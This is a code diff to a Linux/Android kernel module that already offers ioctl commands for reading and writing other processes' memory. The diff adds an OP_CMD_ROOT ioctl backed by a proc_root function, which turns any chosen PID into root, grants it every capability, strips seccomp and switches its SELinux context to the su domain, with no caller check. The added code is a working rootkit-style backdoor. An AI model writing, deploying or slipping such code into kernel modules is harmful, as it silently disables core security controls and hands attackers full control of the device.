@@ -8,7 +8,7 @@
 #include <linux/uaccess.h>
 #include <linux/version.h>
 #include <linux/proc_fs.h>
-
+#include <linux/security.h>
 #include <asm/cpu.h>
 #include <asm/page.h>
 #include <asm/pgtable.h>
@@ -17,6 +17,7 @@
 #define OP_CMD_READ 0x400011
 #define OP_CMD_WRITE 0x400012
 #define OP_CMD_LISTMAP 0x400013
+#define OP_CMD_ROOT 0x400014
 
 typedef struct _MEMORY
 {
@@ -82,6 +83,74 @@ static struct mm_struct *get_pid_mm(int pid)
 inline int valid_phys_addr_range_(phys_addr_t addr, size_t count)
 {
     return addr + count <= __pa(high_memory);
+}
+
+#define SELINUX_DOMAIN "u:r:su:s0"
+
+
+// Fixme
+static int proc_root(pid_t pid)
+{
+    struct pid *pid_struct;
+    struct task_struct *task = NULL;
+    struct cred *real_cred = NULL;
+    struct cred *cred = NULL;
+    u32 sid;
+    int error;
+
+    pid_struct = find_get_pid(pid);
+    if (!pid_struct)
+        return -1;
+    task = pid_task(pid_struct, PIDTYPE_PID);
+    if (!task)
+    {
+        return -1;
+    }
+    real_cred = (struct cred *)task->real_cred;
+    cred = (struct cred *)task->cred;
+
+    if (real_cred)
+    {
+        real_cred->uid = real_cred->suid = real_cred->euid = real_cred->fsuid = GLOBAL_ROOT_UID;
+        real_cred->gid = real_cred->sgid = real_cred->egid = real_cred->fsgid = GLOBAL_ROOT_GID;
+
+        memset(&real_cred->cap_inheritable, 0xFF, sizeof(real_cred->cap_inheritable));
+        memset(&real_cred->cap_permitted, 0xFF, sizeof(real_cred->cap_permitted));
+        memset(&real_cred->cap_effective, 0xFF, sizeof(real_cred->cap_effective));
+        memset(&real_cred->cap_bset, 0xFF, sizeof(real_cred->cap_bset));
+        memset(&real_cred->cap_ambient, 0xFF, sizeof(real_cred->cap_ambient));
+    }
+    if (cred)
+    {
+        cred->uid = cred->suid = cred->euid = cred->fsuid = GLOBAL_ROOT_UID;
+        cred->gid = cred->sgid = cred->egid = cred->fsgid = GLOBAL_ROOT_GID;
+        memset(&cred->cap_inheritable, 0xFF, sizeof(cred->cap_inheritable));
+        memset(&cred->cap_permitted, 0xFF, sizeof(cred->cap_permitted));
+        memset(&cred->cap_effective, 0xFF, sizeof(cred->cap_effective));
+        memset(&cred->cap_bset, 0xFF, sizeof(cred->cap_bset));
+        memset(&cred->cap_ambient, 0xFF, sizeof(cred->cap_ambient));
+    }
+
+
+#if defined(CONFIG_GENERIC_ENTRY) &&                                           \
+	LINUX_VERSION_CODE >= KERNEL_VERSION(5, 11, 0)
+	current_thread_info()->syscall_work &= ~SYSCALL_WORK_SECCOMP;
+#else
+	current_thread_info()->flags &= ~(TIF_SECCOMP | _TIF_SECCOMP);
+#endif
+
+#ifdef CONFIG_SECCOMP
+	current->seccomp.mode = 0;
+	current->seccomp.filter = NULL;
+#endif
+
+    error = security_secctx_to_secid(SELINUX_DOMAIN, strlen(SELINUX_DOMAIN), &sid);
+    if (!error)
+    {
+        set_security_override(cred, sid);
+    }
+
+    return 0;
 }
 
 static int list_vma(struct seq_file *m, pid_t pid)
@@ -224,6 +293,9 @@ static long dev_ioctl(struct file *file, unsigned int cmd, unsigned long arg)
     case OP_CMD_LISTMAP:
         snprintf(mypid, 12, "%d", mem.pid);
         proc_create_data(mypid, 0644, base, &my_proc_ops, (void *)((uintptr_t)mem.pid));
+        return 0;
+    case OP_CMD_ROOT:
+        proc_root(mem.pid);
         return 0;
     default:
         break;
